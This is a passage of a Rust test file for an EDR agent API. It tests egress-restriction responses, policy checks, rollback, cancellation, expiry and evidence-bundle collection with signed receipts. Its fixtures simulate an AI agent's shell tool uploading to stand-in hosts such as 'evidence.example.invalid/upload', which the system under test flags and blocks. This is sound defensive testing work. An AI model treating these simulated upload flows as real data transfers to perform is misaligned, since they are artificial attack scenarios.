                    runtime: ProviderRuntimeState::Active,
                    ..ProviderStatus::unknown()
                },
                network_extension: ProviderStatus {
                    runtime: ProviderRuntimeState::Active,
                    counters: BTreeMap::from([
                        ("flows_observed".to_string(), 11),
                        ("flows_blocked".to_string(), 3),
                        ("remediation_requests".to_string(), 1),
                        ("dropped_verdicts".to_string(), 0),
                    ]),
                    policy_epoch: Some(99),
                    policy_synced: Some(true),
                    enforcement_ready: Some(true),
                    last_reload_observation: Some(
                        crate::macos::status::ProviderReloadObservation {
                            request_id: Some("restrict-egress-reload-1".to_string()),
                            command: Some("reload_policy".to_string()),
                            policy_snapshot_path: Some(reload_policy_path.clone()),
                            generation: Some(reload_generation),
                            accepted: Some(true),
                            reloaded: Some(true),
                            error: None,
                        },
                    ),
                    ..ProviderStatus::unknown()
                },
                ..CombinedSystemExtensionStatus::default()
            })
            .await;
        let body = serde_json::json!({
            "refreshProviders": false,
            "executionId": payload["execution"]["executionId"]
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/network-extension/egress-policy/proof")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build NetworkExtension proof request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("NetworkExtension proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read NetworkExtension proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected NetworkExtension proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode NetworkExtension proof response: {e}"));
        assert_eq!(proof_payload["snapshotPresent"], true);
        assert_eq!(proof_payload["snapshotDecodable"], true);
        assert_eq!(proof_payload["restrictionCount"], 1);
        assert_eq!(proof_payload["activeRestrictionCount"], 1);
        assert_eq!(proof_payload["enforcementReady"], true);
        assert_eq!(proof_payload["liveEnforcementProven"], true);
        assert_eq!(
            proof_payload["liveEnforcementProofReasons"]
                .as_array()
                .unwrap_or_else(|| panic!("missing live-enforcement proof reasons"))
                .len(),
            0
        );
        assert_eq!(proof_payload["flowCounterObserved"], true);
        assert_eq!(proof_payload["observedFlowCount"], 11);
        assert_eq!(proof_payload["blockedFlowCount"], 3);
        assert_eq!(proof_payload["remediationRequestCount"], 1);
        assert_eq!(proof_payload["droppedVerdictCount"], 0);
        assert_eq!(
            proof_payload["providerReloadDelivery"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(proof_payload["providerReloadDelivery"]["observed"], true);
        assert_eq!(proof_payload["providerReloadDelivery"]["matched"], true);
        assert_eq!(
            proof_payload["providerReloadDelivery"]["requestIdMatches"],
            true
        );
        assert_eq!(
            proof_payload["providerReloadDelivery"]["generationMatches"],
            true
        );
        assert_eq!(
            proof_payload["providerReloadDelivery"]["policySnapshotPathMatches"],
            true
        );
        assert_eq!(
            proof_payload["providerReloadDelivery"]["providerReloaded"],
            true
        );
        assert_eq!(
            proof_payload["networkExtensionProvider"]["policy_synced"],
            true
        );
        let proof_snapshot_hash = proof_payload["snapshotHash"]
            .as_str()
            .unwrap_or_else(|| panic!("missing NetworkExtension proof snapshot hash"));
        assert!(proof_snapshot_hash.starts_with("0x"));
        assert_eq!(proof_payload["providerStatusRefresh"]["requested"], false);
        assert_eq!(
            proof_payload["receipt"]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "sensor_state"
        );
        let proof_endpoint_decision =
            &proof_payload["receipt"]["receipt"]["metadata"]["endpointDecision"];
        let proof_receipt_evidence = proof_endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing NetworkExtension proof receipt evidence"));
        let one_hash = sha256(b"1").to_hex_prefixed();
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionEgressPolicySnapshotHash"
                && item["valueHash"].as_str() == Some(proof_snapshot_hash)
        }));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionEgressPolicySnapshotPresent"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionEgressPolicySnapshotDecodable"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionEgressPolicyActiveRestrictionCount"
                && item["valueHash"].as_str() == Some(one_hash.as_str())
        }));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionEgressPolicyProviderRefreshRequested"
                && item["valueHash"].as_str() == Some(false_hash.as_str())
        }));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionFlowCounterObserved"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionLiveEnforcementProven"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionLiveEnforcementProofReasons"
                && item["valueHash"].as_str() == Some(sha256(b"").to_hex_prefixed().as_str())
        }));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionPolicySynced"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionReloadDeliveryMatched"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(proof_receipt_evidence.iter().any(|item| {
            item["key"] == "networkExtensionReloadDeliveryRequestIdMatches"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));

        let policy_body = serde_json::json!({
            "action_type": "egress",
            "target": "https://egress.example.invalid/upload"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/policy-check")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(policy_body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build restricted policy-check request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("restricted policy-check request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read restricted policy-check response: {e}"));
        let policy_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode restricted policy-check response: {e}"));
        assert_eq!(policy_payload["allowed"], false);
        assert_eq!(policy_payload["guard"], "edr_restrict_egress");
        assert_eq!(
            policy_payload["details"]["executionId"],
            payload["execution"]["executionId"]
        );

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing restrict-egress execution id"));
        let body = serde_json::json!({
            "reason": "restore restricted egress"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build restrict-egress rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("restrict-egress rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read restrict-egress rollback response: {e}"));
        let rollback_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode restrict-egress rollback response: {e}"));
        assert_eq!(
            rollback_payload["rollback"]["effects"][0]["effectType"],
            "restore_egress"
        );
        let network_extension_policy =
            read_json_file(state.edr_network_extension_egress_policy_path.as_ref());
        assert_eq!(
            network_extension_policy["restrictions"]
                .as_array()
                .unwrap_or_else(|| panic!("missing NetworkExtension policy restrictions"))
                .len(),
            0
        );

        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/policy-check")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(policy_body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build restored policy-check request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("restored policy-check request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read restored policy-check response: {e}"));
        let restored_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode restored policy-check response: {e}"));
        assert_eq!(restored_payload["allowed"], true);
        assert_eq!(restored_payload["guard"], "enforcement_disabled");

        let body = serde_json::json!({
            "action": "restrict_egress",
            "process": {
                "processGuid": "proc-restrict-egress-1"
            },
            "ttlSeconds": 600,
            "reason": "restrict observed egress again",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build second restrict-egress request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("second restrict-egress request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read second restrict-egress response: {e}"));
        let second_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode second restrict-egress response: {e}"));
        let second_execution_id = second_payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing second restrict-egress execution id"));

        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/policy-check")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(policy_body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build second restricted policy-check request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("second restricted policy-check request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read second restricted policy-check: {e}"));
        let restricted_again: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode second restricted policy-check: {e}"));
        assert_eq!(restricted_again["allowed"], false);
        assert_eq!(restricted_again["guard"], "edr_restrict_egress");

        let body = serde_json::json!({
            "reason": "cancel restricted egress"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{second_execution_id}/cancel"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build restrict-egress cancel request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("restrict-egress cancel request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/policy-check")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(policy_body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build cancel-restored policy-check request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cancel-restored policy-check request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read cancel-restored policy-check response: {e}")
            });
        let cancel_restored: serde_json::Value =
            serde_json::from_slice(&bytes).unwrap_or_else(|e| {
                panic!("failed to decode cancel-restored policy-check response: {e}")
            });
        assert_eq!(cancel_restored["allowed"], true);
        assert_eq!(cancel_restored["guard"], "enforcement_disabled");
        let network_extension_policy =
            read_json_file(state.edr_network_extension_egress_policy_path.as_ref());
        assert_eq!(
            network_extension_policy["restrictions"]
                .as_array()
                .unwrap_or_else(|| panic!("missing NetworkExtension policy restrictions"))
                .len(),
            0
        );

        let body = serde_json::json!({
            "action": "restrict_egress",
            "process": {
                "processGuid": "proc-restrict-egress-1"
            },
            "ttlSeconds": 1,
            "reason": "restrict observed egress until expiration",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build expiring restrict-egress request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("expiring restrict-egress request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read expiring restrict-egress response: {e}"));
        let expiring_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode expiring restrict-egress response: {e}"));
        let expiring_action_id = expiring_payload["execution"]["actionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing expiring restrict-egress action id"));
        {
            let ledger = state.edr_egress_restriction_ledger.lock().await;
            assert!(!ledger.active_for_action(expiring_action_id).is_empty());
        }

        tokio::time::sleep(Duration::from_millis(1100)).await;

        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-executions/expire")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build restrict-egress expiration request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("restrict-egress expiration request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read restrict-egress expiration response: {e}"));
        let expiration_payload: serde_json::Value =
            serde_json::from_slice(&bytes).unwrap_or_else(|e| {
                panic!("failed to decode restrict-egress expiration response: {e}")
            });
        assert_eq!(expiration_payload["expired_count"], 0);
        assert_eq!(
            expiration_payload["rollback_transitions"][0]["execution"]["action"],
            "restrict_egress"
        );
        assert_eq!(
            expiration_payload["rollback_transitions"][0]["execution"]["status"],
            "rolled_back"
        );
        assert_eq!(
            expiration_payload["rollback_transition_receipts"][0]["receipt"]["metadata"]
                ["endpointDecision"]["receiptFamily"],
            "response_execution"
        );
        assert_eq!(
            expiration_payload["rollback_transition_receipts"][0]["receipt"]["metadata"]
                ["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        {
            let ledger = state.edr_egress_restriction_ledger.lock().await;
            assert!(ledger.active_for_action(expiring_action_id).is_empty());
        }
        let network_extension_policy =
            read_json_file(state.edr_network_extension_egress_policy_path.as_ref());
        assert_eq!(
            network_extension_policy["restrictions"]
                .as_array()
                .unwrap_or_else(|| panic!("missing NetworkExtension policy restrictions"))
                .len(),
            0
        );
        let _ = std::fs::remove_file(receipt_path);
    }

    #[tokio::test]
    async fn agent_edr_response_action_executes_collect_evidence_with_execution_receipt() {
        let receipt_path = test_receipt_path();
        let execution_path = test_response_execution_path();
        let keypair = Keypair::from_seed(&[64u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-response-proof-signer".to_string(),
            signer_public_key,
        }));
        state.edr_response_execution_ledger = Arc::new(Mutex::new(
            EndpointResponseExecutionLedger::open(execution_path.clone())
                .unwrap_or_else(|e| panic!("failed to open response execution proof ledger: {e}")),
        ));
        let state = Arc::new(state);
        let app_state = Arc::clone(&state);
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/evidence-bundles/{bundle_id}",
                get(agent_edr_evidence_bundle),
            )
            .route(
                "/api/v1/agent/edr/evidence-bundles/{bundle_id}/archive",
                get(agent_edr_evidence_bundle_archive),
            )
            .route(
                "/api/v1/agent/edr/response-executions",
                get(agent_edr_response_executions),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/cancel",
                post(agent_edr_response_execution_cancel),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/acknowledge",
                post(agent_edr_response_execution_acknowledge),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}",
                get(agent_edr_response_execution),
            )
            .with_state(app_state);
        let identity_metadata = BTreeMap::from([
            ("agentId".to_string(), serde_json::json!("agent-collect-1")),
            (
                "workloadIdentity".to_string(),
                serde_json::json!("workload-collect-1"),
            ),
            (
                "approvalId".to_string(),
                serde_json::json!("approval-collect-1"),
            ),
        ]);
        let observations = vec![
            EndpointObservation {
                observation_id: "collect-tool-1".to_string(),
                host_id: Some("host-collect-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-collect-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-collect-evidence-1".to_string()),
                    image: Some("/usr/bin/python3".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::ToolCall {
                    tool_name: "mcp.shell".to_string(),
                    parameters: serde_json::json!({
                        "command": "python collect.py"
                    }),
                },
                metadata: identity_metadata.clone(),
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "collect-network-1".to_string(),
                host_id: Some("host-collect-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-collect-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-collect-evidence-1".to_string()),
                    image: Some("/usr/bin/python3".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::NetworkFlow {
                    host: "evidence.example.invalid".to_string(),
                    port: 443,
                    protocol: Some("tcp".to_string()),
                    url: Some("https://evidence.example.invalid/upload".to_string()),
                },
                metadata: identity_metadata,
                ..EndpointObservation::default()
            },
        ];
        let body = serde_json::json!({
            "observations": observations,
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build edr findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("edr findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "action": "collect_evidence",
            "process": {
                "processGuid": "proc-collect-evidence-1"
            },
            "ttlSeconds": 600,
            "reason": "collect evidence bundle for graph target",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build response action request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("response action request failed: {e}"));
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read response action response: {e}"));
        assert_eq!(
            status,
            StatusCode::OK,
            "unexpected response action response body: {}",
            String::from_utf8_lossy(&bytes)
        );
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode response action response: {e}"));

        assert_eq!(payload["plan"]["dryRun"], false);
        assert_eq!(payload["plan"]["action"], "collect_evidence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["actionId"],
            payload["plan"]["actionId"]
        );
        assert_eq!(
            payload["execution"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        assert_eq!(payload["execution"]["actor"]["userId"], "operator:test");
        assert_eq!(
            payload["execution"]["actor"]["approvalId"],
            "approval-response-action"
        );
        assert_eq!(payload["affectedIdentityCount"].as_u64(), Some(6));
        assert_eq!(payload["affectedToolCount"].as_u64(), Some(1));
        assert_eq!(
            payload["affectedIdentities"]["hosts"][0]["id"],
            "host-collect-1"
        );
        assert_eq!(payload["affectedIdentities"]["users"][0]["id"], "alice");
        assert_eq!(
            payload["affectedIdentities"]["sessions"][0]["id"],
            "session-collect-1"
        );
        assert_eq!(
            payload["affectedIdentities"]["agents"][0]["id"],
            "agent-collect-1"
        );
        assert_eq!(
            payload["affectedIdentities"]["workloads"][0]["id"],
            "workload-collect-1"
        );
        assert_eq!(
            payload["affectedIdentities"]["approvals"][0]["id"],
            "approval-collect-1"
        );
        assert_eq!(payload["affectedTools"][0]["toolName"], "mcp.shell");
        assert!(
            payload["execution"]["evidenceBundle"]["nodeCount"]
                .as_u64()
                .unwrap_or_default()
                >= 2
        );
        assert!(payload["execution"]["evidenceBundle"]["contentHash"]
            .as_str()
            .unwrap_or_default()
            .starts_with("0x"));
        let bundle_id = payload["execution"]["evidenceBundle"]["bundleId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing execution evidence bundle id"));
        assert_eq!(payload["evidenceBundleArtifact"]["bundleId"], bundle_id);
        assert_eq!(
            payload["evidenceBundleArtifact"]["contentHash"],
            payload["execution"]["evidenceBundle"]["contentHash"]
        );
        assert!(
            payload["evidenceBundleArtifact"]["byteCount"]
                .as_u64()
                .unwrap_or_default()
                > 0
        );

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!("/api/v1/agent/edr/evidence-bundles/{bundle_id}"))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build evidence bundle request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("evidence bundle request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read evidence bundle response: {e}"));
        let bundle_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode evidence bundle response: {e}"));
        assert_eq!(bundle_payload["bundle"]["bundleId"], bundle_id);
        assert_eq!(
            bundle_payload["bundle"]["contentHash"],
            payload["execution"]["evidenceBundle"]["contentHash"]
        );
        assert!(bundle_payload["graph"]["nodes"]
            .as_object()
            .unwrap_or_else(|| panic!("missing evidence bundle graph nodes"))
            .values()
            .any(|node| node["label"] == "evidence.example.invalid:443"));

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing response execution id"));
        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build execution lookup request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("execution lookup request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read execution lookup response: {e}"));
        let execution_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode execution lookup response: {e}"));
        assert_eq!(
            execution_payload["execution"]["execution"]["executionId"],
            execution_id
        );
        assert_eq!(
            execution_payload["execution"]["rollbackRef"],
            payload["execution"]["rollbackRef"]
        );
        assert_eq!(
            execution_payload["execution"]["execution"]["ttlSeconds"],
            serde_json::Value::from(600)
        );
        assert_eq!(
            execution_payload["execution"]["execution"]["actor"]["userId"],
            "operator:test"
        );
        assert_eq!(
            execution_payload["execution"]["execution"]["actor"]["approvalId"],
            "approval-response-action"
        );
        assert_eq!(
            execution_payload["execution"]["affectedIdentityCount"].as_u64(),
            Some(6)
        );
        assert_eq!(
            execution_payload["execution"]["affectedToolCount"].as_u64(),
            Some(1)
        );
        assert_eq!(
            execution_payload["execution"]["affectedIdentities"]["hosts"][0]["id"],
            "host-collect-1"
        );
        assert_eq!(
            execution_payload["execution"]["affectedTools"][0]["toolName"],
            "mcp.shell"
        );

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/response-executions?limit=10")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build execution list request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("execution list request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read execution list response: {e}"));
        let executions_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode execution list response: {e}"));
        assert_eq!(executions_payload["execution_count"], 1);
        assert_eq!(
            executions_payload["executions"][0]["execution"]["executionId"],
            execution_id
        );
        assert_eq!(
            executions_payload["executions"][0]["affectedIdentityCount"].as_u64(),
            Some(6)
        );
        assert_eq!(
            executions_payload["executions"][0]["affectedToolCount"].as_u64(),
            Some(1)
        );

        let request_receipt: SignedReceipt = serde_json::from_value(payload["receipt"].clone())
            .unwrap_or_else(|e| panic!("failed to decode response request receipt: {e}"));
        let request_decision = request_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing response request endpointDecision metadata"));
        assert_eq!(request_decision["receiptFamily"], "response_request");
        assert_eq!(request_decision["actor"]["userId"], "operator:test");
        assert_eq!(
            request_decision["actor"]["sessionId"],
            "session-response-action"
        );
        assert_eq!(request_decision["actor"]["agentId"], "agent-api:test");
        assert_eq!(
            request_decision["actor"]["approvalId"],
            "approval-response-action"
        );

        let execution_receipt: SignedReceipt =
            serde_json::from_value(payload["executionReceipt"].clone())
                .unwrap_or_else(|e| panic!("failed to decode response execution receipt: {e}"));
        let execution_decision = execution_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing response execution endpointDecision metadata"));
        let public_key = execution_decision
            .get("signer")
            .and_then(|signer| signer.get("signerPublicKey"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_else(|| panic!("missing execution receipt signer public key"));
        let public_key = hush_core::PublicKey::from_hex(public_key)
            .unwrap_or_else(|e| panic!("failed to parse execution receipt public key: {e}"));
        let verification =
            execution_receipt.verify(&hush_core::receipt::PublicKeySet::new(public_key));
        assert!(verification.valid);
        assert_eq!(execution_decision["receiptFamily"], "response_execution");
        let execution_providers = execution_decision["sensorState"]["providers"]
            .as_array()
            .unwrap_or_else(|| panic!("missing response execution sensor providers"));
        assert!(execution_providers
            .iter()
            .any(|provider| provider["providerId"] == "agent-api"));
        assert!(execution_providers
            .iter()
            .any(|provider| provider["providerId"] == "macos.endpoint_security"));
        assert!(execution_providers
            .iter()
            .any(|provider| provider["providerId"] == "macos.network_extension"));
        assert_eq!(execution_decision["actor"]["userId"], "operator:test");
        assert_eq!(
            execution_decision["actor"]["sessionId"],
            "session-response-action"
        );
        assert_eq!(execution_decision["actor"]["agentId"], "agent-api:test");
        assert_eq!(
            execution_decision["actor"]["approvalId"],
            "approval-response-action"
        );
        assert_eq!(
            execution_decision["decision"]["findingId"],
            payload["execution"]["executionId"]
        );

        let bundle_receipt: SignedReceipt =
            serde_json::from_value(payload["evidenceBundleReceipt"].clone())
                .unwrap_or_else(|e| panic!("failed to decode evidence bundle receipt: {e}"));
        let bundle_decision = bundle_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing evidence bundle endpointDecision metadata"));
        let public_key = bundle_decision
            .get("signer")
            .and_then(|signer| signer.get("signerPublicKey"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_else(|| panic!("missing evidence bundle receipt signer public key"));
        let public_key = hush_core::PublicKey::from_hex(public_key)
            .unwrap_or_else(|e| panic!("failed to parse evidence bundle receipt public key: {e}"));
        let verification =
            bundle_receipt.verify(&hush_core::receipt::PublicKeySet::new(public_key));
        assert!(verification.valid);
        assert_eq!(bundle_decision["receiptFamily"], "evidence_bundle_manifest");
        assert_eq!(
            bundle_decision["decision"]["findingId"],
            payload["execution"]["evidenceBundle"]["bundleId"]
        );
        assert_eq!(
            bundle_decision["graph"]["graphSliceId"],
            payload["execution"]["evidenceBundle"]["graphSliceId"]
        );

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
